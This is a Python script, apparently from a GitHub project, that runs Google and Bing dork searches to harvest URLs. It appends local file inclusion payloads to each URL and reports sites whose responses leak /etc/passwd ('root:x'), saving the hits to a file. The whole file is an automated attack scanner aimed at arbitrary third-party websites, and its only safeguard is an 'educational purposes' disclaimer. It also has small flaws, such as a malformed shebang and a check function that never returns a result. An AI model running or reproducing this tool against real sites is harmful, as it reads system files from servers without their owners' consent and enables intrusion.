#!/user/bin python3

# Disclaimer: This script is for educational purposes only.  
# github.com/sandiskyy
import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote
from colorama import Fore, Style
import lib.fox

class SearchEngine:
    def get_results(self, query):
        pass

    def extract_urls(self, results_html):
        pass


class GoogleSearch(SearchEngine):
    SEARCH_ENGINE_URL = "https://www.google.com/search"

    def get_results(self, query):
        url = f"{self.SEARCH_ENGINE_URL}?q={query}"
        try:
            response = requests.get(url, timeout=5)
            return response.text
        except requests.exceptions.RequestException as e:
            print(Fore.RED + "[!] Request exception:", e)
            return None

    def extract_urls(self, results_html):
        soup = BeautifulSoup(results_html, "html.parser")
        results = soup.find_all("a")
        return [unquote(result.get("href")[7:].split("&")[0]) for result in results if result.get("href", "").startswith("/url?q")]


class BingSearch(SearchEngine):
    SEARCH_ENGINE_URL = "https://www.bing.com/search"

    def get_results(self, query):
        url = f"{self.SEARCH_ENGINE_URL}?q={query}"
        try:
            response = requests.get(url, timeout=5)
            return response.text
        except requests.exceptions.RequestException as e:
            print(Fore.RED + "[!] Request exception:", e)
            return None

    def extract_urls(self, results_html):
        soup = BeautifulSoup(results_html, "html.parser")
        results = soup.find_all("a", class_="b_algo")
        return [unquote(result.get("href")) for result in results]


class LFIscanner:
    def __init__(self):
        # Read LFI payloads from file
        with open("payloads.txt", "r") as f:
            self.lfi_payloads = [line.strip() for line in f]

        # Read dorks from file
        with open("dorks.txt", "r") as f:
            self.dorks = [line.strip() for line in f]

    def check_for_lfi_vulnerability(self, target_url):
        try:
            response = requests.get(target_url, timeout=5)
            if any(keyword in response.text for keyword in ["root:x"]):
                print(Fore.RED + "[🦊]" + Fore.GREEN +
                      f"LFI vulnerability found at {target_url}" + Style.RESET_ALL)
                with open("vulnerability.txt", "a") as f:
                    f.write(f"{target_url}\n")
                    print(Fore.MAGENTA +
                          "Vulnerability URLs saved in vulnerability.txt file")
            else:
                print(Fore.BLUE + "[-] " + Fore.GREEN +
                      f"{target_url}" + Fore.YELLOW + " is not vulnerable to LFI")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + "[!] Request exception:", e)

    def search_lfi(self, search_engine, query):
        results_html = search_engine.get_results(query)
        if results_html:
            urls = search_engine.extract_urls(results_html)
            for url in urls:
                for payload in self.lfi_payloads:
                    target_url = f"{url}{payload}"
                    self.check_for_lfi_vulnerability(target_url)

    def check_lfi(self, url):
        for payload in self.lfi_payloads:
            target_url = url + payload
            self.check_for_lfi_vulnerability(target_url)

    def run(self):
        while True:
            try:
                choice = input(
                    Fore.WHITE + "🛰️ 1. Scan With Google Dorks \n" + Fore.BLUE + "🌙 2. Scan With Bing Dorks\n" + Fore.MAGENTA + "🎯 3. Target Url\n" + Fore.CYAN + "🛠️ 4. Quit\n" + Fore.GREEN + "\n🦊 : ")
                if choice == "1" or choice == "2":
                    # num_results = input("\nEnter Number To Result: ")
                    search_engine = GoogleSearch() if choice == "1" else BingSearch()
                    for query in self.dorks:
                        query = query.strip()
                        self.search_lfi(search_engine, query)
                    print(Fore.GREEN + "Search finished.")
                elif choice == "3":
                    url_list_path = input(Fore.CYAN + "Wordlist Url: ")
                    with open(url_list_path, 'r') as f:
                        urls = f.readlines()
                    for url in map(str.strip, urls):
                        if self.check_lfi(url):
                            print(Fore.GREEN +
                                  f"LFI vulnerability found at {url}")
                        else:
                            print(Fore.BLUE + f"LFI is not found at {url}")
                    print(Fore.GREEN + "Search finished.")
                elif choice == "4":
                    break
                else:
                    print(Fore.RED + "Please Choose!?")
                    input(Fore.YELLOW + "Press enter to continue...")
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"Request error: {e}")
            except Exception as e:
                print(Fore.RED + f"Error: {e}")


if __name__ == "__main__":
    lib.fox.fox()
    scanner = LFIscanner()
    scanner.run()
